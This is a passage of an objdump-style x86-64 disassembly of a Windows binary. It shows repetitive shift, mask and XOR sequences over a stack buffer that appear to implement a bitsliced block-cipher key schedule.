   1400025d2:	4c 21 e2             	and    %r12,%rdx
   1400025d5:	48 31 c2             	xor    %rax,%rdx
   1400025d8:	48 c1 e0 04          	shl    $0x4,%rax
   1400025dc:	48 21 d8             	and    %rbx,%rax
   1400025df:	48 c1 e1 08          	shl    $0x8,%rcx
   1400025e3:	4c 21 f1             	and    %r14,%rcx
   1400025e6:	48 31 c1             	xor    %rax,%rcx
   1400025e9:	48 31 ca             	xor    %rcx,%rdx
   1400025ec:	48 89 94 35 e8 08 00 	mov    %rdx,0x8e8(%rbp,%rsi,1)
   1400025f3:	00 
   1400025f4:	48 8b 84 35 f0 08 00 	mov    0x8f0(%rbp,%rsi,1),%rax
   1400025fb:	00 
   1400025fc:	48 c1 c0 24          	rol    $0x24,%rax
   140002600:	48 21 f8             	and    %rdi,%rax
   140002603:	48 33 84 35 70 08 00 	xor    0x870(%rbp,%rsi,1),%rax
   14000260a:	00 
   14000260b:	48 89 c1             	mov    %rax,%rcx
   14000260e:	48 89 c2             	mov    %rax,%rdx
   140002611:	48 c1 e2 0c          	shl    $0xc,%rdx
   140002615:	4c 21 e2             	and    %r12,%rdx
   140002618:	48 31 c2             	xor    %rax,%rdx
   14000261b:	48 c1 e0 04          	shl    $0x4,%rax
   14000261f:	48 21 d8             	and    %rbx,%rax
   140002622:	48 c1 e1 08          	shl    $0x8,%rcx
   140002626:	4c 21 f1             	and    %r14,%rcx
   140002629:	48 31 c1             	xor    %rax,%rcx
   14000262c:	48 31 ca             	xor    %rcx,%rdx
   14000262f:	48 89 94 35 f0 08 00 	mov    %rdx,0x8f0(%rbp,%rsi,1)
   140002636:	00 
   140002637:	48 8b 84 35 f8 08 00 	mov    0x8f8(%rbp,%rsi,1),%rax
   14000263e:	00 
   14000263f:	48 c1 c0 24          	rol    $0x24,%rax
   140002643:	48 21 f8             	and    %rdi,%rax
   140002646:	48 33 84 35 78 08 00 	xor    0x878(%rbp,%rsi,1),%rax
   14000264d:	00 
   14000264e:	48 89 c1             	mov    %rax,%rcx
   140002651:	48 89 c2             	mov    %rax,%rdx
   140002654:	48 c1 e2 0c          	shl    $0xc,%rdx
   140002658:	4c 21 e2             	and    %r12,%rdx
   14000265b:	48 31 c2             	xor    %rax,%rdx
   14000265e:	48 c1 e0 04          	shl    $0x4,%rax
   140002662:	48 21 d8             	and    %rbx,%rax
   140002665:	48 c1 e1 08          	shl    $0x8,%rcx
   140002669:	4c 21 f1             	and    %r14,%rcx
   14000266c:	48 31 c1             	xor    %rax,%rcx
   14000266f:	48 31 ca             	xor    %rcx,%rdx
   140002672:	48 89 94 35 f8 08 00 	mov    %rdx,0x8f8(%rbp,%rsi,1)
   140002679:	00 
   14000267a:	48 8b 84 35 00 09 00 	mov    0x900(%rbp,%rsi,1),%rax
   140002681:	00 
   140002682:	48 c1 c0 24          	rol    $0x24,%rax
   140002686:	48 21 f8             	and    %rdi,%rax
   140002689:	48 33 84 35 80 08 00 	xor    0x880(%rbp,%rsi,1),%rax
   140002690:	00 
   140002691:	48 89 c1             	mov    %rax,%rcx
   140002694:	48 89 c2             	mov    %rax,%rdx
   140002697:	48 c1 e2 0c          	shl    $0xc,%rdx
   14000269b:	4c 21 e2             	and    %r12,%rdx
   14000269e:	48 31 c2             	xor    %rax,%rdx
   1400026a1:	48 c1 e0 04          	shl    $0x4,%rax
   1400026a5:	48 21 d8             	and    %rbx,%rax
   1400026a8:	48 c1 e1 08          	shl    $0x8,%rcx
   1400026ac:	4c 21 f1             	and    %r14,%rcx
   1400026af:	48 31 c1             	xor    %rax,%rcx
   1400026b2:	48 31 ca             	xor    %rcx,%rdx
   1400026b5:	48 89 94 35 00 09 00 	mov    %rdx,0x900(%rbp,%rsi,1)
   1400026bc:	00 
   1400026bd:	48 8b 84 35 08 09 00 	mov    0x908(%rbp,%rsi,1),%rax
   1400026c4:	00 
   1400026c5:	48 c1 c0 24          	rol    $0x24,%rax
   1400026c9:	48 21 f8             	and    %rdi,%rax
   1400026cc:	48 33 84 35 88 08 00 	xor    0x888(%rbp,%rsi,1),%rax
   1400026d3:	00 
   1400026d4:	48 89 c1             	mov    %rax,%rcx
   1400026d7:	48 89 c2             	mov    %rax,%rdx
   1400026da:	48 c1 e2 0c          	shl    $0xc,%rdx
   1400026de:	4c 21 e2             	and    %r12,%rdx
   1400026e1:	48 31 c2             	xor    %rax,%rdx
   1400026e4:	48 c1 e0 04          	shl    $0x4,%rax
   1400026e8:	48 21 d8             	and    %rbx,%rax
   1400026eb:	48 c1 e1 08          	shl    $0x8,%rcx
   1400026ef:	4c 21 f1             	and    %r14,%rcx
   1400026f2:	48 31 c1             	xor    %rax,%rcx
   1400026f5:	48 31 ca             	xor    %rcx,%rdx
   1400026f8:	48 89 94 35 08 09 00 	mov    %rdx,0x908(%rbp,%rsi,1)
   1400026ff:	00 
   140002700:	49 81 fd b0 03 00 00 	cmp    $0x3b0,%r13
   140002707:	0f 84 60 02 00 00    	je     0x14000296d
   14000270d:	49 8d 57 08          	lea    0x8(%r15),%rdx
   140002711:	48 8d 8d 50 08 00 00 	lea    0x850(%rbp),%rcx
   140002718:	e8 93 71 00 00       	call   0x1400098b0
   14000271d:	48 8d 0c 2e          	lea    (%rsi,%rbp,1),%rcx
   140002721:	48 81 c1 10 09 00 00 	add    $0x910,%rcx
   140002728:	e8 c3 6e 00 00       	call   0x1400095f0
   14000272d:	4c 8b 84 35 10 09 00 	mov    0x910(%rbp,%rsi,1),%r8
   140002734:	00 
   140002735:	48 8b 94 35 18 09 00 	mov    0x918(%rbp,%rsi,1),%rdx
   14000273c:	00 
   14000273d:	49 f7 d0             	not    %r8
   140002740:	48 f7 d2             	not    %rdx
   140002743:	48 8b 8c 35 38 09 00 	mov    0x938(%rbp,%rsi,1),%rcx
   14000274a:	00 
   14000274b:	48 8b 84 35 40 09 00 	mov    0x940(%rbp,%rsi,1),%rax
   140002752:	00 
   140002753:	48 f7 d0             	not    %rax
   140002756:	48 89 84 35 40 09 00 	mov    %rax,0x940(%rbp,%rsi,1)
   14000275d:	00 
   14000275e:	49 c1 e8 0c          	shr    $0xc,%r8
   140002762:	49 21 f8             	and    %rdi,%r8
   140002765:	4c 33 84 35 90 08 00 	xor    0x890(%rbp,%rsi,1),%r8
   14000276c:	00 
   14000276d:	4d 89 c1             	mov    %r8,%r9
   140002770:	4d 89 c2             	mov    %r8,%r10
   140002773:	49 c1 e2 0c          	shl    $0xc,%r10
   140002777:	4d 21 e2             	and    %r12,%r10
   14000277a:	4d 31 c2             	xor    %r8,%r10
   14000277d:	49 c1 e0 04          	shl    $0x4,%r8
   140002781:	49 21 d8             	and    %rbx,%r8
   140002784:	49 c1 e1 08          	shl    $0x8,%r9
   140002788:	4d 21 f1             	and    %r14,%r9
   14000278b:	4d 31 c1             	xor    %r8,%r9
   14000278e:	4d 31 ca             	xor    %r9,%r10
   140002791:	4c 89 94 35 10 09 00 	mov    %r10,0x910(%rbp,%rsi,1)
   140002798:	00 
   140002799:	48 c1 ea 0c          	shr    $0xc,%rdx
   14000279d:	48 21 fa             	and    %rdi,%rdx
   1400027a0:	48 33 94 35 98 08 00 	xor    0x898(%rbp,%rsi,1),%rdx
   1400027a7:	00 
   1400027a8:	49 89 d0             	mov    %rdx,%r8
   1400027ab:	49 89 d1             	mov    %rdx,%r9
   1400027ae:	49 c1 e1 0c          	shl    $0xc,%r9
   1400027b2:	4d 21 e1             	and    %r12,%r9
   1400027b5:	49 31 d1             	xor    %rdx,%r9
   1400027b8:	48 c1 e2 04          	shl    $0x4,%rdx
   1400027bc:	48 21 da             	and    %rbx,%rdx
   1400027bf:	49 c1 e0 08          	shl    $0x8,%r8
   1400027c3:	4d 21 f0             	and    %r14,%r8
   1400027c6:	49 31 d0             	xor    %rdx,%r8
   1400027c9:	4d 31 c1             	xor    %r8,%r9
   1400027cc:	4c 89 8c 35 18 09 00 	mov    %r9,0x918(%rbp,%rsi,1)
   1400027d3:	00 
   1400027d4:	48 8b 94 35 20 09 00 	mov    0x920(%rbp,%rsi,1),%rdx
   1400027db:	00 
   1400027dc:	48 c1 ea 0c          	shr    $0xc,%rdx
   1400027e0:	48 21 fa             	and    %rdi,%rdx
   1400027e3:	48 33 94 35 a0 08 00 	xor    0x8a0(%rbp,%rsi,1),%rdx
   1400027ea:	00 
   1400027eb:	49 89 d0             	mov    %rdx,%r8
   1400027ee:	49 89 d1             	mov    %rdx,%r9
   1400027f1:	49 c1 e1 0c          	shl    $0xc,%r9
   1400027f5:	4d 21 e1             	and    %r12,%r9
   1400027f8:	49 31 d1             	xor    %rdx,%r9
   1400027fb:	48 c1 e2 04          	shl    $0x4,%rdx
   1400027ff:	48 21 da             	and    %rbx,%rdx
   140002802:	49 c1 e0 08          	shl    $0x8,%r8
   140002806:	4d 21 f0             	and    %r14,%r8
   140002809:	49 31 d0             	xor    %rdx,%r8
   14000280c:	4d 31 c1             	xor    %r8,%r9
   14000280f:	4c 89 8c 35 20 09 00 	mov    %r9,0x920(%rbp,%rsi,1)
   140002816:	00 
   140002817:	48 8b 94 35 28 09 00 	mov    0x928(%rbp,%rsi,1),%rdx
   14000281e:	00 
   14000281f:	48 c1 ea 0c          	shr    $0xc,%rdx
   140002823:	48 21 fa             	and    %rdi,%rdx
   140002826:	48 33 94 35 a8 08 00 	xor    0x8a8(%rbp,%rsi,1),%rdx
   14000282d:	00 
   14000282e:	48 f7 d1             	not    %rcx
   140002831:	49 89 d0             	mov    %rdx,%r8
   140002834:	49 89 d1             	mov    %rdx,%r9
   140002837:	49 c1 e1 0c          	shl    $0xc,%r9
   14000283b:	4d 21 e1             	and    %r12,%r9
   14000283e:	49 31 d1             	xor    %rdx,%r9
   140002841:	48 c1 e2 04          	shl    $0x4,%rdx
   140002845:	48 21 da             	and    %rbx,%rdx
   140002848:	49 c1 e0 08          	shl    $0x8,%r8
   14000284c:	4d 21 f0             	and    %r14,%r8
   14000284f:	49 31 d0             	xor    %rdx,%r8
   140002852:	4d 31 c1             	xor    %r8,%r9
   140002855:	4c 89 8c 35 28 09 00 	mov    %r9,0x928(%rbp,%rsi,1)
   14000285c:	00 
   14000285d:	48 8b 94 35 30 09 00 	mov    0x930(%rbp,%rsi,1),%rdx
   140002864:	00 
   140002865:	48 c1 ea 0c          	shr    $0xc,%rdx
   140002869:	48 21 fa             	and    %rdi,%rdx
   14000286c:	48 33 94 35 b0 08 00 	xor    0x8b0(%rbp,%rsi,1),%rdx
   140002873:	00 
   140002874:	49 89 d0             	mov    %rdx,%r8
   140002877:	49 89 d1             	mov    %rdx,%r9
   14000287a:	49 c1 e1 0c          	shl    $0xc,%r9
   14000287e:	4d 21 e1             	and    %r12,%r9
   140002881:	49 31 d1             	xor    %rdx,%r9
   140002884:	48 c1 e2 04          	shl    $0x4,%rdx
   140002888:	48 21 da             	and    %rbx,%rdx
   14000288b:	49 c1 e0 08          	shl    $0x8,%r8
   14000288f:	4d 21 f0             	and    %r14,%r8
   140002892:	49 31 d0             	xor    %rdx,%r8
   140002895:	4d 31 c1             	xor    %r8,%r9
   140002898:	4c 89 8c 35 30 09 00 	mov    %r9,0x930(%rbp,%rsi,1)
   14000289f:	00 
   1400028a0:	48 c1 e9 0c          	shr    $0xc,%rcx
   1400028a4:	48 21 f9             	and    %rdi,%rcx
   1400028a7:	48 33 8c 35 b8 08 00 	xor    0x8b8(%rbp,%rsi,1),%rcx
   1400028ae:	00 
   1400028af:	48 89 ca             	mov    %rcx,%rdx
   1400028b2:	49 89 c8             	mov    %rcx,%r8
   1400028b5:	49 c1 e0 0c          	shl    $0xc,%r8
   1400028b9:	4d 21 e0             	and    %r12,%r8
   1400028bc:	49 31 c8             	xor    %rcx,%r8
   1400028bf:	48 c1 e1 04          	shl    $0x4,%rcx
   1400028c3:	48 21 d9             	and    %rbx,%rcx
   1400028c6:	48 c1 e2 08          	shl    $0x8,%rdx
   1400028ca:	4c 21 f2             	and    %r14,%rdx
   1400028cd:	48 31 ca             	xor    %rcx,%rdx
   1400028d0:	49 31 d0             	xor    %rdx,%r8
   1400028d3:	4c 89 84 35 38 09 00 	mov    %r8,0x938(%rbp,%rsi,1)
   1400028da:	00 
   1400028db:	48 c1 e8 0c          	shr    $0xc,%rax
   1400028df:	48 21 f8             	and    %rdi,%rax
   1400028e2:	48 33 84 35 c0 08 00 	xor    0x8c0(%rbp,%rsi,1),%rax
   1400028e9:	00 
   1400028ea:	48 89 c1             	mov    %rax,%rcx
   1400028ed:	48 89 c2             	mov    %rax,%rdx
   1400028f0:	48 c1 e2 0c          	shl    $0xc,%rdx
   1400028f4:	4c 21 e2             	and    %r12,%rdx
   1400028f7:	48 31 c2             	xor    %rax,%rdx
   1400028fa:	48 c1 e0 04          	shl    $0x4,%rax
   1400028fe:	48 21 d8             	and    %rbx,%rax
   140002901:	48 c1 e1 08          	shl    $0x8,%rcx
   140002905:	4c 21 f1             	and    %r14,%rcx
   140002908:	48 31 c1             	xor    %rax,%rcx
   14000290b:	48 31 ca             	xor    %rcx,%rdx
   14000290e:	48 89 94 35 40 09 00 	mov    %rdx,0x940(%rbp,%rsi,1)
   140002915:	00 
   140002916:	48 8b 84 35 48 09 00 	mov    0x948(%rbp,%rsi,1),%rax
   14000291d:	00 
   14000291e:	48 c1 e8 0c          	shr    $0xc,%rax
   140002922:	48 21 f8             	and    %rdi,%rax
   140002925:	48 33 84 35 c8 08 00 	xor    0x8c8(%rbp,%rsi,1),%rax
   14000292c:	00 
   14000292d:	48 89 c1             	mov    %rax,%rcx
   140002930:	48 89 c2             	mov    %rax,%rdx
   140002933:	48 c1 e2 0c          	shl    $0xc,%rdx
   140002937:	4c 21 e2             	and    %r12,%rdx
   14000293a:	48 31 c2             	xor    %rax,%rdx
   14000293d:	48 c1 e0 04          	shl    $0x4,%rax
   140002941:	48 21 d8             	and    %rbx,%rax
   140002944:	48 c1 e1 08          	shl    $0x8,%rcx
   140002948:	4c 21 f1             	and    %r14,%rcx
   14000294b:	48 31 c1             	xor    %rax,%rcx
   14000294e:	48 31 ca             	xor    %rcx,%rdx
   140002951:	48 89 94 35 48 09 00 	mov    %rdx,0x948(%rbp,%rsi,1)
   140002958:	00 
   140002959:	49 81 c5 88 00 00 00 	add    $0x88,%r13
   140002960:	48 83 ee 80          	sub    $0xffffffffffffff80,%rsi
   140002964:	49 83 c7 10          	add    $0x10,%r15
   140002968:	e9 33 fb ff ff       	jmp    0x1400024a0
   14000296d:	ba f8 00 00 00       	mov    $0xf8,%edx
   140002972:	48 b9 00 00 f0 00 ff 	movabs $0xf00ff00f00000,%rcx
   140002979:	00 0f 00 
   14000297c:	48 b8 00 00 0f 0f 00 	movabs $0xf0f00000f0f0000,%rax
   140002983:	00 0f 0f 
   140002986:	49 b8 00 00 0f 00 ff 	movabs $0xf000ff000f0000,%r8
   14000298d:	00 f0 00 
   140002990:	49 be 00 00 ff 00 00 	movabs $0xff000000ff0000,%r14
   140002997:	00 ff 00 
   14000299a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400029a0:	4c 8b 94 15 98 07 00 	mov    0x798(%rbp,%rdx,1),%r10
   1400029a7:	00 
   1400029a8:	4c 8b 8c 15 a0 07 00 	mov    0x7a0(%rbp,%rdx,1),%r9
   1400029af:	00 
   1400029b0:	4d 89 d3             	mov    %r10,%r11
   1400029b3:	49 c1 eb 08          	shr    $0x8,%r11
   1400029b7:	4d 31 d3             	xor    %r10,%r11
   1400029ba:	49 21 cb             	and    %rcx,%r11
   1400029bd:	4c 89 de             	mov    %r11,%rsi
   1400029c0:	48 c1 e6 08          	shl    $0x8,%rsi
   1400029c4:	4c 09 de             	or     %r11,%rsi
   1400029c7:	4c 31 d6             	xor    %r10,%rsi
   1400029ca:	49 89 f2             	mov    %rsi,%r10
   1400029cd:	49 c1 ea 04          	shr    $0x4,%r10
   1400029d1:	49 31 f2             	xor    %rsi,%r10
   1400029d4:	49 21 c2             	and    %rax,%r10
   1400029d7:	4d 89 d3             	mov    %r10,%r11
   1400029da:	49 c1 e3 04          	shl    $0x4,%r11
   1400029de:	4d 09 d3             	or     %r10,%r11
   1400029e1:	49 31 f3             	xor    %rsi,%r11
   1400029e4:	4c 89 9c 15 98 07 00 	mov    %r11,0x798(%rbp,%rdx,1)
   1400029eb:	00 
   1400029ec:	4d 89 ca             	mov    %r9,%r10
   1400029ef:	49 c1 ea 08          	shr    $0x8,%r10
   1400029f3:	4d 31 ca             	xor    %r9,%r10
   1400029f6:	49 21 ca             	and    %rcx,%r10
   1400029f9:	4d 89 d3             	mov    %r10,%r11
   1400029fc:	49 c1 e3 08          	shl    $0x8,%r11
   140002a00:	4d 09 d3             	or     %r10,%r11
   140002a03:	4d 31 cb             	xor    %r9,%r11
   140002a06:	4d 89 d9             	mov    %r11,%r9
   140002a09:	49 c1 e9 04          	shr    $0x4,%r9
   140002a0d:	4d 31 d9             	xor    %r11,%r9
   140002a10:	49 21 c1             	and    %rax,%r9
   140002a13:	4d 89 ca             	mov    %r9,%r10
   140002a16:	49 c1 e2 04          	shl    $0x4,%r10
   140002a1a:	4d 09 ca             	or     %r9,%r10
   140002a1d:	4d 31 da             	xor    %r11,%r10
   140002a20:	4c 89 94 15 a0 07 00 	mov    %r10,0x7a0(%rbp,%rdx,1)
   140002a27:	00 
   140002a28:	4c 8b 8c 15 a8 07 00 	mov    0x7a8(%rbp,%rdx,1),%r9
   140002a2f:	00 
   140002a30:	4d 89 ca             	mov    %r9,%r10
   140002a33:	49 c1 ea 08          	shr    $0x8,%r10
   140002a37:	4d 31 ca             	xor    %r9,%r10
   140002a3a:	49 21 ca             	and    %rcx,%r10
   140002a3d:	4d 89 d3             	mov    %r10,%r11
   140002a40:	49 c1 e3 08          	shl    $0x8,%r11
   140002a44:	4d 09 d3             	or     %r10,%r11
   140002a47:	4d 31 cb             	xor    %r9,%r11
   140002a4a:	4d 89 d9             	mov    %r11,%r9
   140002a4d:	49 c1 e9 04          	shr    $0x4,%r9
   140002a51:	4d 31 d9             	xor    %r11,%r9
   140002a54:	49 21 c1             	and    %rax,%r9
   140002a57:	4d 89 ca             	mov    %r9,%r10
   140002a5a:	49 c1 e2 04          	shl    $0x4,%r10
   140002a5e:	4d 09 ca             	or     %r9,%r10
   140002a61:	4d 31 da             	xor    %r11,%r10
   140002a64:	4c 89 94 15 a8 07 00 	mov    %r10,0x7a8(%rbp,%rdx,1)
   140002a6b:	00 
   140002a6c:	4c 8b 8c 15 b0 07 00 	mov    0x7b0(%rbp,%rdx,1),%r9
   140002a73:	00 
   140002a74:	4d 89 ca             	mov    %r9,%r10
   140002a77:	49 c1 ea 08          	shr    $0x8,%r10
   140002a7b:	4d 31 ca             	xor    %r9,%r10
   140002a7e:	49 21 ca             	and    %rcx,%r10
   140002a81:	4d 89 d3             	mov    %r10,%r11
   140002a84:	49 c1 e3 08          	shl    $0x8,%r11
   140002a88:	4d 09 d3             	or     %r10,%r11
   140002a8b:	4d 31 cb             	xor    %r9,%r11
   140002a8e:	4d 89 d9             	mov    %r11,%r9
   140002a91:	49 c1 e9 04          	shr    $0x4,%r9
   140002a95:	4d 31 d9             	xor    %r11,%r9
   140002a98:	49 21 c1             	and    %rax,%r9
   140002a9b:	4d 89 ca             	mov    %r9,%r10
   140002a9e:	49 c1 e2 04          	shl    $0x4,%r10
   140002aa2:	4d 09 ca             	or     %r9,%r10
   140002aa5:	4d 31 da             	xor    %r11,%r10
   140002aa8:	4c 89 94 15 b0 07 00 	mov    %r10,0x7b0(%rbp,%rdx,1)
   140002aaf:	00 
   140002ab0:	4c 8b 8c 15 b8 07 00 	mov    0x7b8(%rbp,%rdx,1),%r9
   140002ab7:	00 
   140002ab8:	4d 89 ca             	mov    %r9,%r10
   140002abb:	49 c1 ea 08          	shr    $0x8,%r10
   140002abf:	4d 31 ca             	xor    %r9,%r10
   140002ac2:	49 21 ca             	and    %rcx,%r10
   140002ac5:	4d 89 d3             	mov    %r10,%r11
   140002ac8:	49 c1 e3 08          	shl    $0x8,%r11
   140002acc:	4d 09 d3             	or     %r10,%r11
   140002acf:	4d 31 cb             	xor    %r9,%r11
   140002ad2:	4d 89 d9             	mov    %r11,%r9
   140002ad5:	49 c1 e9 04          	shr    $0x4,%r9
   140002ad9:	4d 31 d9             	xor    %r11,%r9
   140002adc:	49 21 c1             	and    %rax,%r9
   140002adf:	4d 89 ca             	mov    %r9,%r10
   140002ae2:	49 c1 e2 04          	shl    $0x4,%r10
   140002ae6:	4d 09 ca             	or     %r9,%r10
   140002ae9:	4d 31 da             	xor    %r11,%r10
   140002aec:	4c 89 94 15 b8 07 00 	mov    %r10,0x7b8(%rbp,%rdx,1)
   140002af3:	00 
   140002af4:	4c 8b 8c 15 c0 07 00 	mov    0x7c0(%rbp,%rdx,1),%r9
   140002afb:	00 
   140002afc:	4d 89 ca             	mov    %r9,%r10
   140002aff:	49 c1 ea 08          	shr    $0x8,%r10
   140002b03:	4d 31 ca             	xor    %r9,%r10
   140002b06:	49 21 ca             	and    %rcx,%r10
   140002b09:	4d 89 d3             	mov    %r10,%r11
   140002b0c:	49 c1 e3 08          	shl    $0x8,%r11
   140002b10:	4d 09 d3             	or     %r10,%r11
   140002b13:	4d 31 cb             	xor    %r9,%r11
   140002b16:	4d 89 d9             	mov    %r11,%r9
   140002b19:	49 c1 e9 04          	shr    $0x4,%r9
   140002b1d:	4d 31 d9             	xor    %r11,%r9
   140002b20:	49 21 c1             	and    %rax,%r9
   140002b23:	4d 89 ca             	mov    %r9,%r10
   140002b26:	49 c1 e2 04          	shl    $0x4,%r10
   140002b2a:	4d 09 ca             	or     %r9,%r10
   140002b2d:	4d 31 da             	xor    %r11,%r10
   140002b30:	4c 89 94 15 c0 07 00 	mov    %r10,0x7c0(%rbp,%rdx,1)
   140002b37:	00 
   140002b38:	4c 8b 8c 15 c8 07 00 	mov    0x7c8(%rbp,%rdx,1),%r9
   140002b3f:	00 
   140002b40:	4d 89 ca             	mov    %r9,%r10
   140002b43:	49 c1 ea 08          	shr    $0x8,%r10
   140002b47:	4d 31 ca             	xor    %r9,%r10
   140002b4a:	49 21 ca             	and    %rcx,%r10
   140002b4d:	4d 89 d3             	mov    %r10,%r11
   140002b50:	49 c1 e3 08          	shl    $0x8,%r11
   140002b54:	4d 09 d3             	or     %r10,%r11
   140002b57:	4d 31 cb             	xor    %r9,%r11
   140002b5a:	4d 89 d9             	mov    %r11,%r9
   140002b5d:	49 c1 e9 04          	shr    $0x4,%r9
   140002b61:	4d 31 d9             	xor    %r11,%r9
   140002b64:	49 21 c1             	and    %rax,%r9
   140002b67:	4d 89 ca             	mov    %r9,%r10
   140002b6a:	49 c1 e2 04          	shl    $0x4,%r10
   140002b6e:	4d 09 ca             	or     %r9,%r10
   140002b71:	4d 31 da             	xor    %r11,%r10
   140002b74:	4c 89 94 15 c8 07 00 	mov    %r10,0x7c8(%rbp,%rdx,1)
   140002b7b:	00 
   140002b7c:	4c 8b 8c 15 d0 07 00 	mov    0x7d0(%rbp,%rdx,1),%r9
   140002b83:	00 
   140002b84:	4d 89 ca             	mov    %r9,%r10
   140002b87:	49 c1 ea 08          	shr    $0x8,%r10
   140002b8b:	4d 31 ca             	xor    %r9,%r10
   140002b8e:	49 21 ca             	and    %rcx,%r10
   140002b91:	4d 89 d3             	mov    %r10,%r11
   140002b94:	49 c1 e3 08          	shl    $0x8,%r11
   140002b98:	4d 09 d3             	or     %r10,%r11
   140002b9b:	4d 31 cb             	xor    %r9,%r11
   140002b9e:	4d 89 d9             	mov    %r11,%r9
   140002ba1:	49 c1 e9 04          	shr    $0x4,%r9
   140002ba5:	4d 31 d9             	xor    %r11,%r9
   140002ba8:	49 21 c1             	and    %rax,%r9
   140002bab:	4d 89 ca             	mov    %r9,%r10
   140002bae:	49 c1 e2 04          	shl    $0x4,%r10
   140002bb2:	4d 09 ca             	or     %r9,%r10
   140002bb5:	4d 31 da             	xor    %r11,%r10
   140002bb8:	4c 89 94 15 d0 07 00 	mov    %r10,0x7d0(%rbp,%rdx,1)
   140002bbf:	00 
   140002bc0:	4c 8b 8c 15 d8 07 00 	mov    0x7d8(%rbp,%rdx,1),%r9
   140002bc7:	00 
   140002bc8:	4d 89 ca             	mov    %r9,%r10
   140002bcb:	49 c1 ea 08          	shr    $0x8,%r10
   140002bcf:	4d 31 ca             	xor    %r9,%r10
   140002bd2:	4d 21 f2             	and    %r14,%r10
   140002bd5:	4d 89 d3             	mov    %r10,%r11
   140002bd8:	49 c1 e3 08          	shl    $0x8,%r11
   140002bdc:	4d 09 d3             	or     %r10,%r11
   140002bdf:	4d 31 cb             	xor    %r9,%r11
   140002be2:	4c 89 9c 15 d8 07 00 	mov    %r11,0x7d8(%rbp,%rdx,1)
   140002be9:	00 
   140002bea:	4c 8b 8c 15 e0 07 00 	mov    0x7e0(%rbp,%rdx,1),%r9
   140002bf1:	00 
   140002bf2:	4d 89 ca             	mov    %r9,%r10
   140002bf5:	49 c1 ea 08          	shr    $0x8,%r10
   140002bf9:	4d 31 ca             	xor    %r9,%r10
   140002bfc:	4d 21 f2             	and    %r14,%r10
   140002bff:	4d 89 d3             	mov    %r10,%r11
   140002c02:	49 c1 e3 08          	shl    $0x8,%r11
   140002c06:	4d 09 d3             	or     %r10,%r11
   140002c09:	4d 31 cb             	xor    %r9,%r11
   140002c0c:	4c 89 9c 15 e0 07 00 	mov    %r11,0x7e0(%rbp,%rdx,1)
   140002c13:	00 
   140002c14:	4c 8b 8c 15 e8 07 00 	mov    0x7e8(%rbp,%rdx,1),%r9
   140002c1b:	00 
   140002c1c:	4d 89 ca             	mov    %r9,%r10
   140002c1f:	49 c1 ea 08          	shr    $0x8,%r10
   140002c23:	4d 31 ca             	xor    %r9,%r10
   140002c26:	4d 21 f2             	and    %r14,%r10
   140002c29:	4d 89 d3             	mov    %r10,%r11
   140002c2c:	49 c1 e3 08          	shl    $0x8,%r11
   140002c30:	4d 09 d3             	or     %r10,%r11
   140002c33:	4d 31 cb             	xor    %r9,%r11
   140002c36:	4c 89 9c 15 e8 07 00 	mov    %r11,0x7e8(%rbp,%rdx,1)
   140002c3d:	00 
   140002c3e:	4c 8b 8c 15 f0 07 00 	mov    0x7f0(%rbp,%rdx,1),%r9
   140002c45:	00 
   140002c46:	4d 89 ca             	mov    %r9,%r10
   140002c49:	49 c1 ea 08          	shr    $0x8,%r10
   140002c4d:	4d 31 ca             	xor    %r9,%r10
   140002c50:	4d 21 f2             	and    %r14,%r10
   140002c53:	4d 89 d3             	mov    %r10,%r11
   140002c56:	49 c1 e3 08          	shl    $0x8,%r11
   140002c5a:	4d 09 d3             	or     %r10,%r11
   140002c5d:	4d 31 cb             	xor    %r9,%r11
   140002c60:	4c 89 9c 15 f0 07 00 	mov    %r11,0x7f0(%rbp,%rdx,1)
   140002c67:	00 
   140002c68:	4c 8b 8c 15 f8 07 00 	mov    0x7f8(%rbp,%rdx,1),%r9
   140002c6f:	00 
   140002c70:	4d 89 ca             	mov    %r9,%r10
   140002c73:	49 c1 ea 08          	shr    $0x8,%r10
   140002c77:	4d 31 ca             	xor    %r9,%r10
   140002c7a:	4d 21 f2             	and    %r14,%r10
   140002c7d:	4d 89 d3             	mov    %r10,%r11
   140002c80:	49 c1 e3 08          	shl    $0x8,%r11
   140002c84:	4d 09 d3             	or     %r10,%r11
   140002c87:	4d 31 cb             	xor    %r9,%r11
   140002c8a:	4c 89 9c 15 f8 07 00 	mov    %r11,0x7f8(%rbp,%rdx,1)
   140002c91:	00 
   140002c92:	4c 8b 8c 15 00 08 00 	mov    0x800(%rbp,%rdx,1),%r9
   140002c99:	00 
   140002c9a:	4d 89 ca             	mov    %r9,%r10
   140002c9d:	49 c1 ea 08          	shr    $0x8,%r10
   140002ca1:	4d 31 ca             	xor    %r9,%r10
   140002ca4:	4d 21 f2             	and    %r14,%r10
   140002ca7:	4d 89 d3             	mov    %r10,%r11
   140002caa:	49 c1 e3 08          	shl    $0x8,%r11
   140002cae:	4d 09 d3             	or     %r10,%r11
   140002cb1:	4d 31 cb             	xor    %r9,%r11
   140002cb4:	4c 89 9c 15 00 08 00 	mov    %r11,0x800(%rbp,%rdx,1)
   140002cbb:	00 
   140002cbc:	4c 8b 8c 15 08 08 00 	mov    0x808(%rbp,%rdx,1),%r9
   140002cc3:	00 
   140002cc4:	4d 89 ca             	mov    %r9,%r10
   140002cc7:	49 c1 ea 08          	shr    $0x8,%r10
   140002ccb:	4d 31 ca             	xor    %r9,%r10
   140002cce:	4d 21 f2             	and    %r14,%r10
   140002cd1:	4d 89 d3             	mov    %r10,%r11
   140002cd4:	49 c1 e3 08          	shl    $0x8,%r11
   140002cd8:	4d 09 d3             	or     %r10,%r11
   140002cdb:	4d 31 cb             	xor    %r9,%r11
   140002cde:	4c 89 9c 15 08 08 00 	mov    %r11,0x808(%rbp,%rdx,1)
   140002ce5:	00 
   140002ce6:	4c 8b 8c 15 10 08 00 	mov    0x810(%rbp,%rdx,1),%r9
   140002ced:	00 
   140002cee:	4d 89 ca             	mov    %r9,%r10
   140002cf1:	49 c1 ea 08          	shr    $0x8,%r10
   140002cf5:	4d 31 ca             	xor    %r9,%r10
   140002cf8:	4d 21 f2             	and    %r14,%r10
   140002cfb:	4d 89 d3             	mov    %r10,%r11
   140002cfe:	49 c1 e3 08          	shl    $0x8,%r11
   140002d02:	4d 09 d3             	or     %r10,%r11
   140002d05:	4d 31 cb             	xor    %r9,%r11
   140002d08:	4c 89 9c 15 10 08 00 	mov    %r11,0x810(%rbp,%rdx,1)
   140002d0f:	00 
   140002d10:	4c 8b 8c 15 18 08 00 	mov    0x818(%rbp,%rdx,1),%r9
   140002d17:	00 
   140002d18:	4d 89 ca             	mov    %r9,%r10
